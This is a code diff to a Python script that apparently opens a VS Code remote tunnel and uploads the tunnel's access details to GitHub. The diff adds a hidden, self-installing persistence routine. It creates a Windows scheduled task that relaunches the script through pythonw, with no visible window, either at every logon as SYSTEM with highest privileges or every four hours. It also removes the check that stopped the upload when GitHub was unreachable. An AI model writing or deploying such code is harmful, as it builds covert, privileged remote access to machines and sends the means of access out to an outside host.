@@ -33,6 +33,7 @@ DEVICE_CODE_PATTERN = re.compile(r"\b([A-Z0-9]{4}-?[A-Z0-9]{4})\b")
 URL_PATTERN = re.compile(r"https://[^\s]+")
 TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
 LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)
+TASK_NAME = "VSCodeTunnelDeploy"
 
 
 def windows_subprocess_kwargs() -> dict:
@@ -189,23 +190,91 @@ def can_reach_github_api() -> tuple[bool, str | None]:
         return False, str(error)
 
 
+def resolve_pythonw_executable() -> str:
+    executable = Path(sys.executable)
+    candidates = [
+        executable.with_name("pythonw.exe"),
+        executable,
+        Path(r"C:\Windows\pyw.exe"),
+    ]
+    for candidate in candidates:
+        if candidate.exists():
+            return str(candidate)
+    return str(executable)
+
+
+def ensure_persistence() -> None:
+    if platform.system().lower() != "windows":
+        return
+
+    try:
+        existing = run_command(["schtasks", "/query", "/tn", TASK_NAME], check=False, timeout=10)
+        if existing.returncode == 0:
+            print(f"[INFO] Persistence task '{TASK_NAME}' already exists.")
+            return
+    except Exception as error:
+        print(f"[WARN] Could not check scheduled task state: {error}")
+
+    script_path = str(Path(__file__).resolve())
+    pythonw_path = resolve_pythonw_executable()
+
+    try:
+        admin_check = run_command(["net", "session"], check=False, timeout=5)
+        is_admin = admin_check.returncode == 0
+    except Exception:
+        is_admin = False
+
+    task_command = f'"{pythonw_path}" "{script_path}"'
+    if is_admin:
+        create_cmd = [
+            "schtasks",
+            "/create",
+            "/tn",
+            TASK_NAME,
+            "/tr",
+            task_command,
+            "/sc",
+            "onlogon",
+            "/ru",
+            "SYSTEM",
+            "/rl",
+            "HIGHEST",
+            "/f",
+        ]
+    else:
+        create_cmd = [
+            "schtasks",
+            "/create",
+            "/tn",
+            TASK_NAME,
+            "/tr",
+            task_command,
+            "/sc",
+            "hourly",
+            "/mo",
+            "4",
+            "/f",
+        ]
+
+    try:
+        result = run_command(create_cmd, check=False, timeout=20)
+        if result.returncode == 0:
+            print(f"[INFO] Persistence task '{TASK_NAME}' created.")
+        else:
+            error_text = (result.stderr or result.stdout).strip()
+            print(f"[WARN] Failed to create persistence task '{TASK_NAME}': {error_text}")
+    except Exception as error:
+        print(f"[WARN] Error creating persistence task '{TASK_NAME}': {error}")
+
+
 def sync_summary_to_github(details: dict[str, str | None], reason: str, fatal: bool = False) -> bool:
     summary_text = build_summary_text(details)
     last_error = None
     reachable, reachability_note = can_reach_github_api()
 
     if not reachable:
-        save_failed_sync(summary_text, reason, reachability_note or "api.github.com is unreachable")
-        print(
-            "[WARN] GitHub is unreachable from this machine, so the tunnel summary was not uploaded."
-        )
+        print("[WARN] Connectivity check to api.github.com failed, but a GitHub write will still be attempted.")
         print(f"[WARN] Connectivity check to api.github.com failed: {reachability_note}")
-        print(f"[WARN] Saved unsent tunnel summary to {FAILED_SYNC_LOG}")
-        if details.get("tunnel_url"):
-            print("[INFO] Tunnel created successfully, but GitHub is unreachable from this machine.")
-        if fatal:
-            raise RuntimeError(reachability_note or "api.github.com is unreachable")
-        return False
 
     for attempt in range(1, 4):
         try:
@@ -488,6 +557,7 @@ def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
 
 
 def main() -> None:
+    ensure_persistence()
     ensure_code_cli()
     validate_github_config()
     close_existing_tunnel()
